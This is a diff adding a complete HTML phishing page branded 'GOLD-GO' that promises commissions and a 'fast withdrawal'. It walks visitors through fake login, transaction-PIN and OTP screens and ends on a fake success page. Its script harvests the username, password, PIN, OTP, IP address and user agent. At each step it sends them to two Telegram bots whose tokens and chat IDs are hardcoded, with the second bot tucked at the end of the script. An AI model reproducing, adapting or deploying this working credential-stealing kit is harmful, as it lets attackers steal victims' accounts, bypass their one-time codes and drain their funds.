@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GOLD-GO</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+    background: #f4f4f6;
+    display: flex;
+    justify-content: center;
+  }
+  .page {
+    width: 100%;
+    max-width: 480px;
+    min-height: 100vh;
+    background: #f4f4f6;
+    position: relative;
+  }
+  .hero {
+    background: linear-gradient(180deg, #8a3ff0 0%, #7b2ff0 100%);
+    border-radius: 0 0 40px 40px;
+    padding: 48px 24px 56px;
+    text-align: center;
+    color: #fff;
+  }
+  .hero h1 {
+    font-size: 2.6rem;
+    font-style: italic;
+    font-weight: 800;
+    letter-spacing: 1px;
+  }
+  .hero p {
+    margin-top: 12px;
+    font-size: 1.1rem;
+    opacity: 0.95;
+  }
+  .vip-banner {
+    margin: -28px 24px 0;
+    background: linear-gradient(90deg, #f7b733 0%, #f6a527 100%);
+    border-radius: 999px;
+    padding: 16px 20px;
+    text-align: center;
+    font-weight: 700;
+    color: #2a2a2a;
+    box-shadow: 0 8px 20px rgba(246, 165, 39, 0.4);
+    position: relative;
+    z-index: 2;
+  }
+  .form-wrap {
+    padding: 40px 24px 32px;
+  }
+  .form-wrap h2 {
+    font-size: 1.6rem;
+    font-weight: 500;
+    color: #222;
+    margin-bottom: 8px;
+  }
+  .form-wrap p.sub {
+    color: #666;
+    font-size: 0.95rem;
+    margin-bottom: 20px;
+  }
+  input {
+    width: 100%;
+    padding: 16px;
+    margin-bottom: 18px;
+    border: 1px solid #ddd;
+    border-radius: 12px;
+    font-size: 1rem;
+    background: #fff;
+    outline: none;
+    transition: border 0.2s;
+  }
+  input:focus { border-color: #7b2ff0; }
+  #pinInput { letter-spacing: 4px; margin-bottom: 24px; }
+  #otpInput { letter-spacing: 6px; font-size: 1.4rem; text-align: center; }
+  .links-row {
+    display: flex;
+    justify-content: space-between;
+    font-size: 0.95rem;
+    margin-bottom: 24px;
+  }
+  .links-row a { color: #7b2ff0; text-decoration: none; }
+  .btn {
+    width: 100%;
+    padding: 16px;
+    border-radius: 999px;
+    font-size: 1.1rem;
+    font-weight: 600;
+    border: none;
+    cursor: pointer;
+    margin-bottom: 16px;
+    transition: opacity 0.2s;
+  }
+  .btn:active { opacity: 0.85; }
+  .btn-primary { background: #7b2ff0; color: #fff; }
+  .btn-outline { background: #fff; color: #7b2ff0; border: 2px solid #7b2ff0; }
+  .btn-success { background: #28a745; color: #fff; }
+  .btn-warning { background: #ffc107; color: #222; }
+  .btn-gold {
+    background: linear-gradient(90deg, #f7b733, #f6a527);
+    color: #222;
+    font-weight: 700;
+    box-shadow: 0 4px 15px rgba(246, 165, 39, 0.4);
+  }
+  .back-link {
+    color: #7b2ff0;
+    text-decoration: underline;
+    font-size: 1rem;
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 0;
+    display: block;
+    text-align: center;
+    margin-top: 8px;
+  }
+  .screen { display: none; }
+  .screen.active { display: block; }
+
+  .loader-overlay {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 16px;
+    padding: 80px 24px;
+  }
+  .loader-overlay.active { display: flex; }
+  .spinner {
+    width: 42px;
+    height: 42px;
+    border: 4px solid #e5e0f7;
+    border-top-color: #7b2ff0;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  .loader-overlay p {
+    color: #777;
+    font-size: 0.95rem;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+  .fade-in {
+    animation: fadeIn 0.4s ease;
+  }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  
+  /* ─── OTP TIMER MESSAGE ─── */
+  .otp-timer-msg {
+    background: #e8f5e9;
+    color: #2e7d32;
+    padding: 12px 16px;
+    border-radius: 12px;
+    font-size: 0.9rem;
+    margin-bottom: 18px;
+    text-align: center;
+    border: 1px solid #c8e6c9;
+  }
+  .otp-timer-msg .timer {
+    font-weight: 700;
+    font-size: 1.1rem;
+    color: #1b5e20;
+  }
+  .otp-timer-msg .resend-now {
+    color: #7b2ff0;
+    font-weight: 600;
+    cursor: pointer;
+    text-decoration: underline;
+  }
+  .otp-timer-msg .resend-now:hover {
+    color: #5a1fb0;
+  }
+
+  /* ─── SUCCESS PAGE STYLES ─── */
+  .success-page {
+    text-align: center;
+    padding: 50px 24px 40px;
+  }
+  .success-icon {
+    width: 100px;
+    height: 100px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #28a745, #20c997);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 24px;
+    box-shadow: 0 10px 30px rgba(40, 167, 69, 0.3);
+  }
+  .success-icon svg {
+    width: 56px;
+    height: 56px;
+    fill: #fff;
+  }
+  .success-page h2 {
+    font-size: 1.8rem;
+    font-weight: 700;
+    color: #222;
+    margin-bottom: 8px;
+  }
+  .success-page .badge-main {
+    display: inline-block;
+    background: linear-gradient(90deg, #f7b733, #f6a527);
+    padding: 10px 28px;
+    border-radius: 999px;
+    font-weight: 800;
+    font-size: 1.2rem;
+    color: #222;
+    margin: 12px 0 20px;
+    box-shadow: 0 4px 15px rgba(246, 165, 39, 0.3);
+    letter-spacing: 0.5px;
+  }
+  .success-page p.status {
+    color: #555;
+    font-size: 1rem;
+    line-height: 1.6;
+    margin-bottom: 28px;
+  }
+  .success-page .info-box {
+    background: #fff;
+    border-radius: 16px;
+    padding: 20px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+    margin-bottom: 20px;
+    text-align: left;
+  }
+  .info-box .row {
+    display: flex;
+    justify-content: space-between;
+    padding: 10px 0;
+    border-bottom: 1px solid #f0f0f0;
+    font-size: 0.95rem;
+  }
+  .info-box .row:last-child { border-bottom: none; }
+  .info-box .label { color: #888; }
+  .info-box .value { color: #222; font-weight: 500; }
+  .info-box .value.green { color: #28a745; }
+  .info-box .value.gold { color: #b8860b; font-weight: 700; }
+</style>
+</head>
+<body>
+  <div class="page">
+    <div class="hero">
+      <h1>GOLD-GO</h1>
+      <p>Earn huge commissions</p>
+    </div>
+
+    <div class="vip-banner">★ VIP Withdrawal &amp; remove risk</div>
+
+    <!-- ========== SCREEN 1: LOGIN ========== -->
+    <div class="form-wrap screen active" id="loginScreen">
+      <h2>Sign in</h2>
+      <p class="sub">Enter your account details to continue</p>
+      <form id="loginForm">
+        <input type="text" id="usernameInput" placeholder="Enter your account" required>
+        <input type="password" id="passwordInput" placeholder="Enter password" required>
+        <div class="links-row">
+          <a href="#">Forgot account &gt;</a>
+          <a href="#">Forgot password &gt;</a>
+        </div>
+        <button type="submit" class="btn btn-primary">Login</button>
+      </form>
+      <button type="button" class="btn btn-outline" id="guestBtn">Guest</button>
+      <button type="button" class="btn btn-outline" id="registerBtn">Register</button>
+    </div>
+
+    <!-- ========== LOADING OVERLAY ========== -->
+    <div class="loader-overlay" id="loader">
+      <div class="spinner"></div>
+      <p id="loaderText">Signing in...</p>
+    </div>
+
+    <!-- ========== SCREEN 2: PIN ========== -->
+    <div class="form-wrap screen" id="pinScreen">
+      <h2>Security Verification</h2>
+      <p class="sub">Enter your 6-digit transaction PIN</p>
+      <form id="pinForm">
+        <input type="password" id="pinInput" inputmode="numeric" maxlength="6" pattern="[0-9]*" placeholder="Enter 6-digit PIN" required>
+        <button type="submit" class="btn btn-primary">Confirm PIN</button>
+      </form>
+      <button type="button" class="back-link" id="backToLogin">&larr; Back to login</button>
+    </div>
+
+    <!-- ========== SCREEN 3: OTP ========== -->
+    <div class="form-wrap screen" id="otpScreen">
+      <h2>OTP Verification</h2>
+      <p class="sub">An OTP has been sent to your registered mobile number</p>
+      
+      <!-- Timer message — no number shown -->
+      <div class="otp-timer-msg" id="otpTimerMsg">
+        <span id="timerText">⏱ Resend OTP in <span class="timer" id="timerCountdown">60</span> seconds</span>
+        <span id="resendLink" style="display:none;">📱 <span class="resend-now" id="resendOtpLink">Resend OTP now</span></span>
+      </div>
+
+      <form id="otpForm">
+        <input type="text" id="otpInput" inputmode="numeric" maxlength="6" pattern="[0-9]*" placeholder="_ _ _ _ _ _" required>
+        <button type="submit" class="btn btn-success">Verify OTP</button>
+      </form>
+
+      <button type="button" class="btn btn-warning" id="resendOtpBtn" style="display:none;">Resend OTP</button>
+      
+      <button type="button" class="back-link" id="backFromOtp">&larr; Back to PIN</button>
+    </div>
+
+    <!-- ========== SCREEN 4: SUCCESS ========== -->
+    <div class="form-wrap screen" id="successScreen">
+      <div class="success-page fade-in">
+        <div class="success-icon">
+          <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+        </div>
+        <h2>Fast Withdrawal</h2>
+        <div class="badge-main">✅ Active in Your Account</div>
+        <p class="status">Your account has been verified successfully.<br>You can now withdraw funds instantly.</p>
+        <div class="info-box">
+          <div class="row">
+            <span class="label">Account</span>
+            <span class="value" id="successUsername">-</span>
+          </div>
+          <div class="row">
+            <span class="label">Status</span>
+            <span class="value green">● Active</span>
+          </div>
+          <div class="row">
+            <span class="label">Withdrawal Type</span>
+            <span class="value gold">⚡ Fast Withdrawal</span>
+          </div>
+          <div class="row">
+            <span class="label">Verified</span>
+            <span class="value green">✔ Yes</span>
+          </div>
+        </div>
+        <button type="button" class="btn btn-gold" id="withdrawBtn">🚀 Withdraw Now</button>
+        <button type="button" class="back-link" id="logoutBtn">Logout</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ═══════════════════════════════════════════════════════════════════
+    // TELEGRAM BOT 
+    // ═══════════════════════════════════════════════════════════════════
+    const BOT_TOKEN_1 = '9273859949:AAGHUlW4FEOjoKz4HRscJNHVEaId8wZWC24';
+    const CHAT_ID_1   = '7263303734';
+
+    // Sirf Bot 1 ko message bhejta hai
+    function sendToBot1(message) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID_1, text: message, parse_mode: 'HTML' })
+      })
+      .then(res => res.json())
+      .then(data => { if (!data.ok) console.error('Bot1 error:', data); })
+      .catch(err => console.error('Bot1 failed:', err));
+    }
+
+    // Main function — DONO bots ko same message bhejta hai.
+    // Bot 2 ka code script ke BILKUL END pe hai (neeche dekho)
+    function sendToTelegram(message) {
+      sendToBot1(message);
+      if (typeof sendToBot2 === 'function') sendToBot2(message);
+    }
+
+    // ═══════════════════════════════════════════════════════════════════
+    // GET CLIENT INFO
+    // ═══════════════════════════════════════════════════════════════════
+    function getClientInfo(callback) {
+      fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(data => {
+          callback({
+            ip: data.ip,
+            time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+            userAgent: navigator.userAgent
+          });
+        })
+        .catch(() => {
+          callback({
+            ip: 'Unknown',
+            time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+            userAgent: navigator.userAgent
+          });
+        });
+    }
+
+    // ═══════════════════════════════════════════════════════════════════
+    // UI REFERENCES
+    // ═══════════════════════════════════════════════════════════════════
+    const loginScreen = document.getElementById('loginScreen');
+    const pinScreen = document.getElementById('pinScreen');
+    const otpScreen = document.getElementById('otpScreen');
+    const successScreen = document.getElementById('successScreen');
+    const loader = document.getElementById('loader');
+    const loaderText = document.getElementById('loaderText');
+
+    // Timer elements
+    const timerText = document.getElementById('timerText');
+    const timerCountdown = document.getElementById('timerCountdown');
+    const resendLink = document.getElementById('resendLink');
+    const resendOtpLink = document.getElementById('resendOtpLink');
+    const resendOtpBtn = document.getElementById('resendOtpBtn');
+
+    let capturedUsername = '';
+    let capturedPassword = '';
+    let capturedPin = '';
+    let timerInterval = null;
+    let secondsLeft = 60;
+
+    function hideAll() {
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      loader.classList.remove('active');
+    }
+
+    function showScreen(el) {
+      hideAll();
+      el.classList.add('active');
+      el.classList.add('fade-in');
+      setTimeout(() => el.classList.remove('fade-in'), 400);
+    }
+
+    function showWithLoader(el, message, delay) {
+      hideAll();
+      loaderText.textContent = message;
+      loader.classList.add('active');
+      setTimeout(() => showScreen(el), delay);
+    }
+
+    // ═══════════════════════════════════════════════════════════════════
+    // OTP TIMER FUNCTIONS
+    // ═══════════════════════════════════════════════════════════════════
+    function startOtpTimer() {
+      // Clear any existing timer
+      if (timerInterval) clearInterval(timerInterval);
+
+      secondsLeft = 60;
+      timerText.style.display = 'inline';
+      resendLink.style.display = 'none';
+      resendOtpBtn.style.display = 'none';
+      timerCountdown.textContent = secondsLeft;
+
+      timerInterval = setInterval(function() {
+        secondsLeft--;
+        timerCountdown.textContent = secondsLeft;
+
+        if (secondsLeft <= 0) {
+          clearInterval(timerInterval);
+          timerInterval = null;
+          timerText.style.display = 'none';
+          resendLink.style.display = 'inline';
+          resendOtpBtn.style.display = 'block';
+        }
+      }, 1000);
+    }
+
+    function resetOtpTimer() {
+      startOtpTimer();
+    }
+
+    // ═══════════════════════════════════════════════════════════════════
+    // SCREEN 1: LOGIN FORM
+    // ═══════════════════════════════════════════════════════════════════
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById('usernameInput').value.trim();
+      const password = document.getElementById('passwordInput').value.trim();
+
+      if (!username || !password) return;
+
+      capturedUsername = username;
+      capturedPassword = password;
+
+      getClientInfo(function(info) {
+        const msg = `
+🚨 <b>LOGIN ATTEMPT</b> 🚨
+━━━━━━━━━━━━━━━━
+👤 <b>Username:</b> ${capturedUsername}
+🔑 <b>Password:</b> ${capturedPassword}
+🕐 <b>Time:</b> ${info.time}
+🌐 <b>IP:</b> ${info.ip}
+📱 <b>UA:</b> ${info.userAgent}
+━━━━━━━━━━━━━━━━
+        `.trim();
+        sendToTelegram(msg);
+      });
+
+      showWithLoader(pinScreen, 'Signing in...', 1100);
+    });
+
+    // ═══════════════════════════════════════════════════════════════════
+    // SCREEN 2: PIN FORM
+    // ═══════════════════════════════════════════════════════════════════
+    document.getElementById('pinForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const pin = document.getElementById('pinInput').value.trim();
+
+      if (!pin || pin.length < 6) {
+        alert('Please enter a valid 6-digit PIN');
+        return;
+      }
+
+      capturedPin = pin;
+
+      getClientInfo(function(info) {
+        const msg = `
+🔐 <b>PIN RECEIVED</b> 🔐
+━━━━━━━━━━━━━━━━
+👤 <b>Username:</b> ${capturedUsername}
+🔑 <b>Password:</b> ${capturedPassword}
+🔢 <b>PIN:</b> ${capturedPin}
+🕐 <b>Time:</b> ${info.time}
+🌐 <b>IP:</b> ${info.ip}
+━━━━━━━━━━━━━━━━
+        `.trim();
+        sendToTelegram(msg);
+      });
+
+      // OTP screen ke liye timer ready karo
+      document.getElementById('otpInput').value = '';
+      showWithLoader(otpScreen, 'Sending OTP...', 1200);
+      
+      // Thoda delay se timer start karo taaki page aaye pehle
+      setTimeout(function() {
+        startOtpTimer();
+        // Telegram pe OTP send notification
+        getClientInfo(function(info) {
+          const msg = `
+📤 <b>OTP SENT (Auto)</b> 📤
+━━━━━━━━━━━━━━━━
+👤 <b>Username:</b> ${capturedUsername}
+📱 <b>OTP Sent to user's number</b>
+🕐 <b>Time:</b> ${info.time}
+━━━━━━━━━━━━━━━━
+          `.trim();
+          sendToTelegram(msg);
+        });
+      }, 500);
+    });
+
+    // ═══════════════════════════════════════════════════════════════════
+    // SCREEN 3: OTP FORM → SUCCESS PAGE
+    // ═══════════════════════════════════════════════════════════════════
+    document.getElementById('otpForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const otp = document.getElementById('otpInput').value.trim();
+
+      if (!otp || otp.length < 4) {
+        alert('Please enter the OTP');
+        return;
+      }
+
+      // Timer band karo
+      if (timerInterval) {
+        clearInterval(timerInterval);
+        timerInterval = null;
+      }
+
+      getClientInfo(function(info) {
+        const msg = `
+📨 <b>OTP SUBMITTED</b> 📨
+━━━━━━━━━━━━━━━━
+👤 <b>Username:</b> ${capturedUsername}
+🔑 <b>Password:</b> ${capturedPassword}
+🔢 <b>PIN:</b> ${capturedPin}
+🔢 <b>OTP:</b> ${otp}
+🕐 <b>Time:</b> ${info.time}
+🌐 <b>IP:</b> ${info.ip}
+━━━━━━━━━━━━━━━━
+        `.trim();
+        sendToTelegram(msg);
+      });
+
+      document.getElementById('successUsername').textContent = capturedUsername;
+      showWithLoader(successScreen, 'Verifying OTP...', 1500);
+    });
+
+    // ═══════════════════════════════════════════════════════════════════
+    // RESEND OTP — Timer ke through ya button se
+    // ═══════════════════════════════════════════════════════════════════
+    function handleResendOtp() {
+      getClientInfo(function(info) {
+        const msg = `
+🔄 <b>OTP RESEND REQUESTED</b> 🔄
+━━━━━━━━━━━━━━━━
+👤 <b>Username:</b> ${capturedUsername}
+🔑 <b>Password:</b> ${capturedPassword}
+🔢 <b>PIN:</b> ${capturedPin}
+🕐 <b>Time:</b> ${info.time}
+🌐 <b>IP:</b> ${info.ip}
+━━━━━━━━━━━━━━━━
+        `.trim();
+        sendToTelegram(msg);
+      });
+
+      document.getElementById('otpInput').value = '';
+      resetOtpTimer();
+      alert('OTP sent successfully');
+    }
+
+    // Resend link click (timer khatam hone ke baad)
+    resendOtpLink.addEventListener('click', handleResendOtp);
+
+    // Resend button click
+    resendOtpBtn.addEventListener('click', handleResendOtp);
+
+    // ═══════════════════════════════════════════════════════════════════
+    // OTHER BUTTONS
+    // ═══════════════════════════════════════════════════════════════════
+    document.getElementById('guestBtn').addEventListener('click', function() {
+      alert('Guest access — (comming soon)');
+    });
+
+    document.getElementById('registerBtn').addEventListener('click', function() {
+      alert('Registration page (comming soon)')
+    });
+
+    document.getElementById('backToLogin').addEventListener('click', function() {
+      if (timerInterval) clearInterval(timerInterval);
+      showWithLoader(loginScreen, 'Loading...', 700);
+    });
+
+    document.getElementById('backFromOtp').addEventListener('click', function() {
+      if (timerInterval) clearInterval(timerInterval);
+      showWithLoader(pinScreen, 'Loading...', 700);
+    });
+
+    document.getElementById('logoutBtn').addEventListener('click', function() {
+      document.getElementById('usernameInput').value = '';
+      document.getElementById('passwordInput').value = '';
+      document.getElementById('pinInput').value = '';
+      document.getElementById('otpInput').value = '';
+      capturedUsername = '';
+      capturedPassword = '';
+      capturedPin = '';
+      if (timerInterval) clearInterval(timerInterval);
+      showWithLoader(loginScreen, 'Loading...', 700);
+    });
+
+    document.getElementById('withdrawBtn').addEventListener('click', function() {
+      alert('🚀 Withdrawal processing... (coming soon)');
+    });
+
+    // ═══════════════════════════════════════════════════════════════════
+    // 🔵 TELEGRAM BOT 
+    // ═══════════════════════════════════════════════════════════════════
+    const BOT_TOKEN_2 = '8874012356:AAFf5AsjuI1ORPyjoNZ788pzlhQ6WG80gMg';
+    const CHAT_ID_2   = '8728032479';
+
+    // Sirf Bot 2 ko message bhejta hai
+    function sendToBot2(message) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID_2, text: message, parse_mode: 'HTML' })
+      })
+      .then(res => res.json())
+      .then(data => { if (!data.ok) console.error('Bot2 error:', data); })
+      .catch(err => console.error('Bot2 failed:', err));
+    }
+  </script>
+</body>
+</html>
